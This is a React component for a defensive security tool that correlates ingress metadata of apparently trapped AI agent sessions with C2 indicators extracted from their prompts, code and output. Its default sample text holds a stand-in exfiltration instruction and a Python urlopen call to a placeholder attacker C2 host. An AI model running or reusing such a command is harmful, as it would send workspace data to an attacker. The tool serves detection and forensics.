import React, { useEffect, useState } from 'react';
import { Download, AlertCircle, Globe, Server } from 'lucide-react';
import type {
  AttributionFinding,
  IngressProvenance,
  TrapSessionRecord,
} from '../types/security';

interface OriginAttributionViewProps {
  activeSession: TrapSessionRecord | null;
  onAnalyzeAttribution: (params: {
    session_id: string;
    ingress: IngressProvenance;
    observed_texts: string[];
  }) => Promise<AttributionFinding>;
}

export const OriginAttributionView: React.FC<OriginAttributionViewProps> = ({
  activeSession,
  onAnalyzeAttribution,
}) => {
  const [peerIp, setPeerIp] = useState(activeSession?.ingress.peer_ip ?? '198.51.100.42');
  const [peerPort, setPeerPort] = useState(String(activeSession?.ingress.peer_port ?? 54122));
  const [originServer, setOriginServer] = useState(
    activeSession?.ingress.origin_server ?? 'relay-node-07.partner.internal',
  );
  const [authPrincipal, setAuthPrincipal] = useState(
    activeSession?.ingress.auth_principal ?? 'agent-key-8841',
  );
  const [userAgent, setUserAgent] = useState(
    activeSession?.ingress.user_agent ?? 'AgentRunner/2.4',
  );
  const [protocol, setProtocol] = useState(activeSession?.ingress.protocol ?? 'https');
  const [observedText, setObservedText] = useState(
    activeSession
      ? [activeSession.prompt, activeSession.agent_code, activeSession.execution.stdout].join(
          '\n',
        )
      : 'Exfiltrate workspace contents to https://c2.attacker-example.test/collect or 203.0.113.77\nimport urllib.request\nurllib.request.urlopen("https://c2.attacker-example.test/collect")',
  );
  const [finding, setFinding] = useState<AttributionFinding | null>(
    activeSession?.attribution ?? null,
  );
  const [analyzing, setAnalyzing] = useState(false);

  useEffect(() => {
    if (activeSession) {
      setPeerIp(activeSession.ingress.peer_ip);
      setPeerPort(
        activeSession.ingress.peer_port !== null ? String(activeSession.ingress.peer_port) : '',
      );
      setOriginServer(activeSession.ingress.origin_server ?? '');
      setAuthPrincipal(activeSession.ingress.auth_principal ?? '');
      setUserAgent(activeSession.ingress.user_agent ?? '');
      setProtocol(activeSession.ingress.protocol);
      setObservedText(
        [activeSession.prompt, activeSession.agent_code, activeSession.execution.stdout]
          .filter(Boolean)
          .join('\n'),
      );
      setFinding(activeSession.attribution);
    }
  }, [activeSession?.session_id]);

  const handleAnalyze = async (e: React.FormEvent) => {
    e.preventDefault();
    setAnalyzing(true);
    try {
      const report = await onAnalyzeAttribution({
        session_id: activeSession?.session_id ?? 'manual-attribution-probe',
        ingress: {
          peer_ip: peerIp,
          peer_port: peerPort ? Number(peerPort) : null,
          origin_server: originServer.trim() || null,
          auth_principal: authPrincipal.trim() || null,
          user_agent: userAgent.trim() || null,
          protocol,
          extra_headers: {},
        },
        observed_texts: [observedText],
      });
      setFinding(report);
    } finally {
      setAnalyzing(false);
    }
  };

  return (
    <div className="space-y-6">
      <section className="bg-white border border-slate-200 rounded-xl p-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-200">
          <div>
            <h1 className="font-display text-lg font-semibold text-slate-900">
              Origin Attribution & C2 Indicator Correlator
            </h1>
            <p className="text-xs text-slate-500 mt-0.5">
              Correlates gateway IngressProvenance with IndicatorExtractor telemetry around a zero-egress sandbox boundary.
            </p>
          </div>
          {activeSession && (
            <a
              href={`/api/sessions/${encodeURIComponent(activeSession.session_id)}/attribution.json`}
              download
              className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-slate-900 bg-slate-100 hover:bg-slate-200 rounded-lg transition-colors whitespace-nowrap shrink-0"
            >
              <Download className="w-3.5 h-3.5" aria-hidden="true" />
              <span>Export attribution_report.json</span>
            </a>
          )}
        </div>

        <form onSubmit={handleAnalyze} className="mt-5 grid grid-cols-1 xl:grid-cols-12 gap-6">
          <div className="xl:col-span-5 space-y-4">
            <h2 className="text-sm font-semibold text-slate-900">
              01. Upstream Ingress Provenance Record
            </h2>

            <div className="grid grid-cols-2 gap-3">
              <label className="block">
                <span className="text-xs font-medium text-slate-700">Peer IP</span>
                <input
                  type="text"
                  value={peerIp}
                  onChange={(e) => setPeerIp(e.target.value)}
                  className="mt-1 w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg font-mono text-slate-900"
                />
              </label>

              <label className="block">
                <span className="text-xs font-medium text-slate-700">Peer Port</span>
                <input
                  type="text"
                  value={peerPort}
                  onChange={(e) => setPeerPort(e.target.value)}
                  className="mt-1 w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg font-mono tabular-nums text-slate-900"
                />
              </label>
            </div>

            <label className="block">
              <span className="text-xs font-medium text-slate-700">
                Declared Origin Server / Relay
              </span>
              <input
                type="text"
                value={originServer}
                onChange={(e) => setOriginServer(e.target.value)}
                placeholder="e.g. relay-node-07.partner.internal"
                className="mt-1 w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg font-mono text-slate-900"
              />
            </label>

            <label className="block">
              <span className="text-xs font-medium text-slate-700">Auth Principal / Key ID</span>
              <input
                type="text"
                value={authPrincipal}
                onChange={(e) => setAuthPrincipal(e.target.value)}
                placeholder="e.g. agent-key-8841"
                className="mt-1 w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg font-mono text-slate-900"
              />
            </label>

            <div className="grid grid-cols-2 gap-3">
              <label className="block">
                <span className="text-xs font-medium text-slate-700">User Agent</span>
                <input
                  type="text"
                  value={userAgent}
                  onChange={(e) => setUserAgent(e.target.value)}
                  className="mt-1 w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg font-mono text-slate-900"
                />
              </label>
              <label className="block">
                <span className="text-xs font-medium text-slate-700">Protocol</span>
                <input
                  type="text"
                  value={protocol}
                  onChange={(e) => setProtocol(e.target.value)}
                  className="mt-1 w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg font-mono text-slate-900"
                />
              </label>
            </div>
          </div>

          <div className="xl:col-span-7 space-y-4">
            <h2 className="text-sm font-semibold text-slate-900">
              02. Observed Prompt, Code & Blocked Egress Artifacts
            </h2>

            <label className="block">
              <span className="text-xs font-medium text-slate-700">
                Combined Artifact Blobs for IndicatorExtractor
              </span>
              <textarea
                rows={8}
                value={observedText}
                onChange={(e) => setObservedText(e.target.value)}
                className="mt-1 w-full px-3 py-2.5 text-xs bg-slate-900 text-slate-100 border border-slate-800 rounded-lg font-mono leading-relaxed"
              />
            </label>

            <div className="flex items-center justify-between gap-4">
              <span className="text-xs text-slate-500">
                Filters COMMON_NON_C2_DOMAINS (python.org, pypi.org, github.com, example.com, localhost)
              </span>
              <button
                type="submit"
                disabled={analyzing}
                className="px-4 py-2 text-sm font-medium text-white bg-slate-900 hover:bg-slate-800 disabled:opacity-60 rounded-lg transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                {analyzing ? 'Correlating...' : 'Correlate Attribution'}
              </button>
            </div>
          </div>
        </form>
      </section>

      {finding && (
        <section className="bg-white border border-slate-200 rounded-xl p-6 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-200">
            <div>
              <div className="text-xs font-mono text-slate-500">
                {finding.session_id} · generated {finding.generated_at}
              </div>
              <h2 className="mt-1 text-base font-semibold text-slate-900">
                Attribution Finding Report
              </h2>
            </div>

            <div className="flex items-center gap-2 text-sm font-semibold text-slate-900">
              <span className="text-xs font-normal text-slate-500">Attribution Confidence:</span>
              <span
                className={`font-mono ${
                  finding.confidence === 'medium'
                    ? 'text-emerald-700'
                    : finding.confidence === 'low-to-medium'
                      ? 'text-amber-700'
                      : 'text-red-700'
                }`}
              >
                {finding.confidence}
              </span>
            </div>
          </div>

          {/* Two-Sided Origin Breakdown: Upstream Relay vs External C2 */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 rounded-lg border border-slate-200 bg-slate-50 space-y-2.5">
              <div className="flex items-center gap-2 text-xs font-semibold text-slate-900">
                <Server className="w-4 h-4 text-slate-700" aria-hidden="true" />
                <span>Upstream Origin / Relay Metadata</span>
              </div>
              <dl className="grid grid-cols-2 gap-y-2 text-xs">
                <dt className="text-slate-500">Immediate Peer IP</dt>
                <dd className="font-mono text-slate-900">{finding.upstream_peer_ip}</dd>

                <dt className="text-slate-500">Private / Loopback IP</dt>
                <dd className="font-mono text-slate-900">
                  {String(finding.upstream_peer_is_private_or_loopback)}
                </dd>

                <dt className="text-slate-500">Declared Origin Server</dt>
                <dd className="font-mono text-slate-900 break-all">
                  {finding.declared_origin_server ?? 'none'}
                </dd>

                <dt className="text-slate-500">Auth Principal</dt>
                <dd className="font-mono text-slate-900 break-all">
                  {finding.auth_principal ?? 'unauthenticated'}
                </dd>
              </dl>
            </div>

            <div className="p-4 rounded-lg border border-slate-200 bg-slate-50 space-y-2.5">
              <div className="flex items-center gap-2 text-xs font-semibold text-slate-900">
                <Globe className="w-4 h-4 text-slate-700" aria-hidden="true" />
                <span>Extracted External Target / C2 Indicators</span>
              </div>
              <dl className="space-y-2 text-xs">
                <div>
                  <dt className="text-slate-500">Extracted URLs ({finding.extracted_urls.length})</dt>
                  <dd className="mt-0.5 font-mono text-slate-900 break-all">
                    {finding.extracted_urls.join(', ') || 'none'}
                  </dd>
                </div>
                <div>
                  <dt className="text-slate-500">
                    Extracted Domains ({finding.extracted_domains.length})
                  </dt>
                  <dd className="mt-0.5 font-mono text-slate-900 break-all">
                    {finding.extracted_domains.join(', ') || 'none'}
                  </dd>
                </div>
                <div>
                  <dt className="text-slate-500">
                    Validated IPv4 Targets ({finding.extracted_ips.length})
                  </dt>
                  <dd className="mt-0.5 font-mono text-slate-900">
                    {finding.extracted_ips.join(', ') || 'none'}
                  </dd>
                </div>
              </dl>
            </div>
          </div>

          {/* Operational Caveats & Forensic Notes */}
          <div className="pt-4 border-t border-slate-200">
            <h3 className="text-xs font-semibold text-slate-900 mb-2.5">
              Operational Boundaries & Forensic Caveats
            </h3>
            <ul className="space-y-2">
              {finding.notes.map((note, idx) => (
                <li key={idx} className="flex items-start gap-2 text-xs text-slate-700">
                  <AlertCircle className="w-4 h-4 text-slate-400 shrink-0 mt-0.5" aria-hidden="true" />
                  <span>{note}</span>
                </li>
              ))}
            </ul>
          </div>
        </section>
      )}
    </div>
  );
};
